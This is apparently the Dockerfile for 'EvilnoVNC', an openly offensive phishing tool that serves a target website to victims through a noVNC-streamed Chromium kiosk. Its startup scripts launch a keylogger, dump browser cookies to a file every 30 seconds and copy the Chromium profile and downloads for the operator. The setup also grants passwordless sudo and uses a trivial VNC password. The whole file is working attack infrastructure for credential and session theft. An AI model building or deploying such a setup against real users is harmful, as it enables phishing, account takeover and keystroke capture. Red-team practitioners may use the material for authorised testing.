FROM alpine

LABEL maintainer="JoelGMSec - https://darkbyte.net"

ENV DISPLAY :0

RUN apk add sudo bash xfce4 xvfb xdpyinfo lightdm-gtk-greeter x11vnc xfce4-terminal chromium python3 py3-pip git openssl curl gcc libc-dev python3-dev php socat python3-tkinter && \
    rm -rf /usr/bin/python && ln -s /usr/bin/python3 /usr/bin/python && \
    echo 'CHROMIUM_FLAGS="--disable-gpu --disable-software-rasterizer --disable-dev-shm-usage --kiosk --no-sandbox --password-store=basic --start-fullscreen --noerrdialogs"' >> /etc/chromium/chromium.conf && \
    dbus-uuidgen > /var/lib/dbus/machine-id

RUN adduser -h /home/user -s /bin/bash -S -D user && echo "user:false" | chpasswd && \
    echo 'user ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers

USER user
WORKDIR /home/user

RUN mkdir -p /home/user/.vnc && x11vnc -storepasswd false /home/user/.vnc/passwd && \
    git clone https://github.com/novnc/noVNC.git /home/user/noVNC && \
    git clone https://github.com/novnc/websockify /home/user/noVNC/utils/websockify && \
    rm -rf /home/user/noVNC/.git && \
    rm -rf /home/user/noVNC/utils/websockify/.git && \
    sudo apk del git

RUN echo 'sudo /bin/bash -c "php -q -S 0.0.0.0:80 &" > /dev/null 2>&1' > /home/user/server.sh && \
    echo 'echo "URL=$WEBPAGE" > php.ini ; URL=$(head -1 php.ini | cut -d "=" -f 2)' >> /home/user/server.sh && \
    echo 'while [ ! -f /tmp/resolution.txt ]; do' >> /home/user/server.sh && \
    echo 'sleep 3 ; done' >> /home/user/server.sh && \
    echo 'sudo pkill -9 php ; sudo socat TCP-LISTEN:80,reuseaddr,fork TCP:localhost:5980 &' >> /home/user/server.sh && \
    echo 'RESOLUTION=$(head -1 /tmp/resolution.txt)' >> /home/user/server.sh && \
    echo 'sudo /bin/bash -c /home/user/startVNC.sh $RESOLUTION' >> /home/user/server.sh && \
    chmod +x /home/user/server.sh

RUN echo 'export DISPLAY=:0' > /home/user/kiosk.sh && \
    echo 'URL=$(head -1 php.ini | cut -d "=" -f 2)' >> /home/user/kiosk.sh && \
    echo 'cp /home/user/noVNC/vnc_lite.html /home/user/noVNC/index.html' >> /home/user/kiosk.sh && \
    echo 'TITLE=$(curl -sk $URL | grep "<title>" | grep "</title>" | sed "s/<[^>]*>//g")' >> /home/user/kiosk.sh && \
    echo 'echo $TITLE > title.txt && sed -i "4s/.*/$(head -1 title.txt)/g" noVNC/index.html' >> /home/user/kiosk.sh && \
    echo 'sudo chmod a-rwx /usr/bin/xfce4-panel && sudo chmod a-rwx /usr/bin/thunar' >> /home/user/kiosk.sh && \
    echo 'sudo chmod a-rwx /usr/bin/xfce4-terminal' >> /home/user/kiosk.sh && \
    echo 'sudo mkdir Downloads 2> /dev/null && sudo chmod 777 -R Downloads && sudo chmod 777 kiosk.zip' >> /home/user/kiosk.sh && \
    echo 'sudo mkdir -p /var/run/dbus && sudo dbus-daemon --config-file=/usr/share/dbus-1/system.conf --print-address' >> /home/user/kiosk.sh && \
    echo 'unzip -n kiosk.zip && sleep 6 && /usr/bin/chromium-browser --load-extension=/home/user/kiosk/ --kiosk $URL --fast ---fast-start &' >> /home/user/kiosk.sh && \
    chmod +x /home/user/kiosk.sh

RUN echo 'RESOLUTION=$(head -1 /tmp/resolution.txt)' > /home/user/startVNC.sh && \
    echo 'sudo rm -f /tmp/.X${DISPLAY#:}-lock ; /bin/bash -c "/home/user/kiosk.sh" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "touch /home/user/Downloads/Cookies.txt ; mkdir /home/user/Downloads/Default" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "touch /home/user/Downloads/Keylogger.txt ; sudo pip3 install pyxhook pycryptodome" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "sleep 30 && sudo python3 /home/user/keylogger.py 2> log.txt" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo python3 cookies.py > Downloads/Cookies.txt ; done" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/.config/chromium/Default /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
    echo 'nohup /bin/bash -c "while true ; do sleep 30 ; sudo cp -R -u /root/Downloads/ /home/user/Downloads/ ; done" &' >> /home/user/startVNC.sh && \
    echo 'nohup /usr/bin/Xvfb $DISPLAY -screen 0 $RESOLUTION -ac +extension GLX +render -noreset > /dev/null || true &' >> /home/user/startVNC.sh && \
    echo 'while [[ ! $(xdpyinfo -display $DISPLAY 2> /dev/null) ]]; do sleep .3; done' >> /home/user/startVNC.sh && \
    echo 'nohup startxfce4 > /dev/null || true &' >> /home/user/startVNC.sh && \
    echo 'nohup x11vnc -xkb -noxrecord -noxfixes -noxdamage -many -shared -display $DISPLAY -rfbauth /home/user/.vnc/passwd -rfbport 5900 "$@" &' >> /home/user/startVNC.sh && \
    echo 'nohup /home/user/noVNC/utils/novnc_proxy --vnc localhost:5900 --listen 5980' >> /home/user/startVNC.sh && \
    chmod +x /home/user/startVNC.sh

COPY Files/cookies.py /home/user/
COPY Files/keylogger.py /home/user/
COPY Files/vnc_lite.html /home/user/noVNC/
COPY Files/cursor.js /home/user/noVNC/core/util/
COPY Files/rfb.js /home/user/noVNC/core/
COPY Files/ui.js /home/user/noVNC/app/
COPY Files/kiosk.zip /home/user/
COPY Files/index.php /home/user/

ENTRYPOINT ["/bin/bash","-c", "\
            EvilnoVNC () { \
                ./server.sh \"$@\"; \
            }; \"$@\"", "foo"]

EXPOSE 80
CMD ["EvilnoVNC"]
